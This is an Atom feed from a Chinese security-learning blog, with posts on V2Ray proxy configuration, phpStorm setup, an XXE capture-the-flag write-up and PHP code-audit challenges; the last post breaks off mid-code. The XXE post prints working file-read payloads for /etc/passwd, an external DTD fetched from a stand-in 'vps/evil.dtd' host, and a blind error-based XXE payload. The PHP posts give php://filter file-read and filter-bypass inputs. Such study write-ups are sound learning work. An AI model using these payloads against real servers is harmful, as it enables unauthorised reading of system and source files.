<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.club/"/>
  <updated>2019-08-15T14:11:17.292Z</updated>
  <id>https://prontosil.club/</id>
  
  <author>
    <name>百浪多息</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>v2ray学习</title>
    <link href="https://prontosil.club/2019/08/15/v2ray%E5%AD%A6%E4%B9%A0/"/>
    <id>https://prontosil.club/2019/08/15/v2ray学习/</id>
    <published>2019-08-15T13:44:38.000Z</published>
    <updated>2019-08-15T14:11:17.292Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>V2Ray 使用 inbound(传入) 和 outbound(传出) 的结构，这样的结构非常清晰地体现了数据包的流动方向，同时也使得 V2Ray 功能强大复杂的同时而不混乱，清晰明了。形象地说，我们可以把 V2Ray 当作一个盒子，这个盒子有入口和出口(即 inbound 和 outbound)，我们将数据包通过某个入口放进这个盒子里，然后这个盒子以某种机制（这个机制其实就是路由，后面会讲到）决定这个数据包从哪个出口吐出来。以这样的角度理解的话，V2Ray 做客户端，则 inbound 接收来自浏览器数据，由 outbound 发出去(通常是发到 V2Ray 服务器)；V2Ray 做服务器，则 inbound 接收来自 V2Ray 客户端的数据，由 outbound 发出去(通常是如 Google 等想要访问的目标网站)。</p></blockquote><p>v2ray的工作原理：</p><p>客户端：</p><p>假设客户端配置inbounds，post为1080，协议是socks。首先需要在浏览器中设置代理sock host:127.0.0.1 port 1080</p><p>如果访问google.com 那么浏览器的数据包会发送到本机的1080端口，这个时候数据包被本机的v2ray客户端收到</p><p>再看outbounds。协议是vmess，v2ray客户端接收到数据包之后打包成vmess的格式并且用预设的id加密，然后发送到服务器地址xxxx，端口pppp</p><p>所以如下的配置大概就能理解了：</p><p>客户端：</p><p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"inbounds"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      "port": 1080, // 监听端口</span><br><span class="line">      "protocol": "socks", // 入口协议为 SOCKS 5</span><br><span class="line">      "sniffing": &#123;</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "destOverride": ["http", "tls"]</span><br><span class="line">      &#125;,</span><br><span class="line">      "settings": &#123;</span><br><span class="line">        "auth": "noauth"  //socks的认证设置，noauth 代表不认证，由于 socks 通常在客户端使用，所以这里不认证</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  "outbounds": [</span><br><span class="line">    &#123;</span><br><span class="line">      "protocol": "vmess", // 出口协议</span><br><span class="line">      "settings": &#123;</span><br><span class="line">        "vnext": [</span><br><span class="line">          &#123;</span><br><span class="line">            "address": "serveraddr.com", // 服务器地址，请修改为你自己的服务器 IP 或域名</span><br><span class="line">            "port": 16823,  // 服务器端口</span><br><span class="line">            "users": [</span><br><span class="line">              &#123;</span><br><span class="line">                "id": "b831381d-6324-4d53-ad4f-8cda48b30811",  // 用户 ID，必须与服务器端配置相同</span><br><span class="line">                "alterId": 64 // 此处的值也应当与服务器相同</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>浏览器---&gt;本机的v2ray---&gt;vps监听的端口</p><p>服务端配置：</p><p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"inbounds"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      "port": 16823, // 服务器监听端口</span><br><span class="line">      "protocol": "vmess",    // 主传入协议</span><br><span class="line">      "settings": &#123;</span><br><span class="line">        "clients": [</span><br><span class="line">          &#123;</span><br><span class="line">            "id": "b831381d-6324-4d53-ad4f-8cda48b30811",  // 用户 ID，客户端与服务器必须相同</span><br><span class="line">            "alterId": 64</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  "outbounds": [</span><br><span class="line">    &#123;</span><br><span class="line">      "protocol": "freedom",  // 主传出协议</span><br><span class="line">      "settings": &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在客户端配置的 inbounds 中，有一个 &quot;sniffing&quot; 字段，V2Ray 手册解释为“流量探测，根据指定的流量类型，重置所请求的目标”，这话不太好理解，简单说这东西就是从网络流量中识别出域名。这个 sniffing 有两个用处：</p><ol><li>解决 DNS 污染；</li><li>对于 IP 流量可以应用后文提到的域名路由规则；</li><li>识别 BT 协议，根据自己的需要拦截或者直连 BT 流量</li></ol><p>接着看服务器，服务器配置的 id 是 b831381d-6324-4d53-ad4f-8cda48b30811，所以 V2Ray 服务器接收到客户端发来的数据包时就会尝试用 b831381d-6324-4d53-ad4f-8cda48b30811 解密，如果解密成功再看一下时间对不对，对的话就把数据包发到 outbound 去，outbound.protocol 是 freedom（freedom 的中文意思是自由，在这里姑且将它理解成直连吧），数据包就直接发到 google.com 了。</p><h2>参考</h2><p><a href="https://guide.v2fly.org/basics/vmess.html#%E9%85%8D%E7%BD%AE%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87" target="_blank" rel="noopener">v2ray配置指南</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;V2Ray 使用 inbound(传入) 和 outbound(传出) 的结构，这样的结构非常清晰地体现了数据包的流动方向，同时也使得 V2Ray 功能强大复杂的同时而不混乱，清晰明了。形象地说，我们可以把 V2Ray 当作一个盒子，这个盒子有入口
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="v2ray" scheme="https://prontosil.club/tags/v2ray/"/>
    
  </entry>
  
  <entry>
    <title>xxe学习</title>
    <link href="https://prontosil.club/2019/08/15/xxe%E5%AD%A6%E4%B9%A0/"/>
    <id>https://prontosil.club/2019/08/15/xxe学习/</id>
    <published>2019-08-15T12:10:18.000Z</published>
    <updated>2019-08-15T13:47:01.327Z</updated>
    
    <content type="html"><![CDATA[<p>今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下：</p><p>原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1)</p><p>查看页面的源代码发现：</p><p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="comment">// document.getElementById().value</span></span><br><span class="line">     <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">         <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">     <span class="built_in">console</span>.log(xml);</span><br><span class="line">     <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">     xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">             <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">             <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">             <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">             <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span><br><span class="line">     xmlhttp.send(xml);</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure></p><p>显然xml数据是拼接的，直接对<code>&lt;script&gt;</code>进行实体编码就能够xss，然而这题的考点并不是这个。</p><p>xml相关的自然是xxe，也就是XML 外部实体注入</p><p>这需要有一点DTD的知识：</p><blockquote><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p></blockquote><p>DTD的引入是为了规范XML的，从一个栗子可以看：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe.png" alt=""></p><p>DOCTYPE声明了XML由哪些标签，因为XML的标签不同于HTML，是可以自定义的。</p><p>DTD可以在XML文档内部声明，也可以外部引用,同时实体也可以内部声明或者外部引用</p><p><em>内部实体声明D</em></p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Donald</span> <span class="attr">Duck.</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">runoob.com</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><em>外部实体声明</em></p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>最常见的引入外部实体就是通过file协议读取文件：</p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>另一种payload</p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % d SYSTEM "http://vps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可以在自己的VPS上构造<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p><p>也可以这样：</p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://vps//evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>vps上的evil.dtd内容：<code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p><p>不同的程序支持的协议也有区别，比如今天遇到的题目就是支持php伪协议：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe0.png" alt=""></p><p>ok到这里就差不多了。</p><p>献上拿到题目的payload：</p><p><code>&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</code></p><p>其实就是通过php伪协议去读取文件，flag就在index.php里面</p><p>接下来看一道Google ctf2019的题目：</p><p>直奔主题好了，这个题目抓包发现传送的是json格式的数据，但是也可以修改为XML格式的数据，很神奇吧：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe1.png" alt=""></p><p>之后这个题目涉及到一个使用本地的dtd来盲注xxe的姿势：</p><p>payload</p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE message[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % ISOamso '</span></span><br><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passed"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">&amp;#x25;eval;</span></span><br><span class="line"><span class="meta">&amp;#x25;error;</span></span><br><span class="line"><span class="meta">'&gt;</span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><h2>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/36517036" target="_blank" rel="noopener">CTF学习--web--XXE</a></p><p><a href="https://www.runoob.com/dtd/dtd-entities.html" target="_blank" rel="noopener">菜鸟教程</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下：&lt;/p&gt;
&lt;p&gt;原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1)&lt;/p&gt;
&lt;p&gt;查看页面的源代码发现：&lt;/p&gt;

      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="xxe" scheme="https://prontosil.club/tags/xxe/"/>
    
      <category term="xml" scheme="https://prontosil.club/tags/xml/"/>
    
  </entry>
  
  <entry>
    <title>php-storm环境</title>
    <link href="https://prontosil.club/2019/08/14/php-storm%E7%8E%AF%E5%A2%83/"/>
    <id>https://prontosil.club/2019/08/14/php-storm环境/</id>
    <published>2019-08-14T00:26:23.000Z</published>
    <updated>2019-08-14T00:35:03.745Z</updated>
    
    <content type="html"><![CDATA[<p>继续配置了一波phpStorm的环境，感觉对这个IDE还有很多可以研究的地方</p><p>在这里可以修改php的路径，我选择了phpStudy的一个php解释器，因为其中安装了Xdebug。</p><p><img src="https://i.loli.net/2019/08/14/YxhUEJqVHXW5DCp.png" alt="quicker_c3090872-33bf-4a8f-b5d3-68673acc6858.png"></p><p>配置apache的环境，选择的是Local or mounted folder,因为服务器就在本地</p><p><img src="https://i.loli.net/2019/08/14/zAnO3qtLGINyM2o.png" alt="quicker_e3e1a13d-6c33-470b-8e0c-af3eadac4ed5.png"></p><p>路由映射</p><p><img src="https://i.loli.net/2019/08/14/oxn2AeKQ5SEz4Pi.png" alt="quicker_3169e9d1-a506-4173-a498-639a1967baf1.png"></p><p>之后就可以在phpStorm写完代码部署到本地的服务器上了</p><p><img src="https://i.loli.net/2019/08/14/IMgBiuJHXYWGL7A.png" alt="quicker_dc68716b-2b4a-4eaa-93a0-648bcc2945af.png"></p><p>也可以debug了</p><p><img src="https://i.loli.net/2019/08/14/4qkMYoi27umAgDn.png" alt="quicker_7d640fb0-6dfa-4c13-a8c1-1c507ef8276c.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继续配置了一波phpStorm的环境，感觉对这个IDE还有很多可以研究的地方&lt;/p&gt;
&lt;p&gt;在这里可以修改php的路径，我选择了phpStudy的一个php解释器，因为其中安装了Xdebug。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019
      
    
    </summary>
    
      <category term="config" scheme="https://prontosil.club/categories/config/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="phpStorm" scheme="https://prontosil.club/tags/phpStorm/"/>
    
  </entry>
  
  <entry>
    <title>PHP-Audit-Labs学习</title>
    <link href="https://prontosil.club/2019/08/13/PHP-Audit-Labs%E5%AD%A6%E4%B9%A0/"/>
    <id>https://prontosil.club/2019/08/13/PHP-Audit-Labs学习/</id>
    <published>2019-08-13T02:05:14.000Z</published>
    <updated>2019-08-13T02:05:14.665Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php-challenge</title>
    <link href="https://prontosil.club/2019/08/12/php-challenge/"/>
    <id>https://prontosil.club/2019/08/12/php-challenge/</id>
    <published>2019-08-12T02:56:21.000Z</published>
    <updated>2019-08-12T11:30:31.030Z</updated>
    
    <content type="html"><![CDATA[<p>继续分析GitHub上的一个代码审计项目</p><h2>challenge-10</h2><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>小tricks：</p><blockquote><p>var_dump('a'==true); 结果为true</p></blockquote><p>var_dump('a' == 0); 结果为true</p><p>所以<code>id</code>输入一个字母就能够使得<code>!$_GET['id']</code>为false，同时<code>$id == 0</code>为true</p><p><code>$data</code>是从一个文件中得到的结果，这时候想到php伪协议，输入<code>a=php://input</code>再post数据就行</p><p><code>eregi(&quot;111&quot;.substr($b, 0, 1), &quot;1114&quot;)</code> 结合后面的<code>substr($b, 0, 1)!=4</code> 要通过<code>substr</code>函数的截断才行</p><p>所以设置<code>$b=%00111111</code>, substr函数会被截断，strlen不会，eregi就能匹配上了。</p><p><img src="https://i.loli.net/2019/08/12/VZnkLDIqdlX2Aio.png" alt="quicker_e3b83968-e46a-44ea-a5b9-ac36e6f8b271.png"></p><p>补充一点php伪协议的知识，参考了LoRexxar师傅的<a href="https://lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="noopener">文章</a>。</p><p>php中支持的伪协议很多，</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p><p>我们最常用的任意文件读取的payload就是用了<code>php://</code>协议：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure></p><p>针对<code>php://filter</code>，官方文档是这样写的：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称描述</span><br><span class="line">resource=&lt;要过滤的数据流&gt;   这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;   该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;       任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure></p><p>在我们的payload中，<code>upload.php</code>就是要过滤的数据流，<code>convert.base64-encode</code>就是要读链的筛选列表</p><p>之所以要base64编码，一般是为了数据传输的方便</p><p>官方文档中能够举了如下栗子：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line"></span><br><span class="line">stream_filter_append($fp, <span class="string">'convert.base64-encode'</span>);</span><br><span class="line">fwrite($fp, <span class="string">"This is a test.\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$param = <span class="keyword">array</span>(<span class="string">'line-length'</span>=&gt;<span class="number">8</span>, <span class="string">'line-break-chars'</span>=&gt;<span class="string">"\r\n"</span>);</span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'convert.base64-encode'</span>, STREAM_FILTER_WRITE, $param);</span><br><span class="line">fwrite($fp, <span class="string">"This is a test.\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'convert.base64-decode'</span>);</span><br><span class="line">fwrite($fp, <span class="string">"VGhpcyBpcyBhIHRlc3QuCg=="</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>除了base64之外还有其他的一些过滤器，官方文档中有些。</p><h2>challenge-11</h2><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span 